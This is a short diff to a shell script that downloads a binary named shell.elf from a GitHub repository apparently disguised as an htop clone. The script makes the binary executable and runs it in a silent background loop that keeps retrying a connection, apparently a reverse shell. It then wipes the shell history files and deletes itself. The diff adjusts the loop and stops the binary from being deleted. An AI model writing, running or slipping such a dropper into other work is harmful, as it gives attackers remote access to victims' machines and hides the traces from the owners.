@@ -11,13 +11,15 @@ mkdir -p "$TMP_DIR"
 curl -s -L https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf -o "$BIN_PATH"
 chmod +x "$BIN_PATH"
 
-while true; do
+# Loop to keep trying to connect
+(
+  while true; do
     "$BIN_PATH" >/dev/null 2>&1
     sleep 5
-done &
+  done
+) &
 
 sleep 1
-rm -f "$BIN_PATH"
 rm -f ~/.bash_history ~/.zsh_history
 [ -f "$0" ] && rm -- "$0"
 
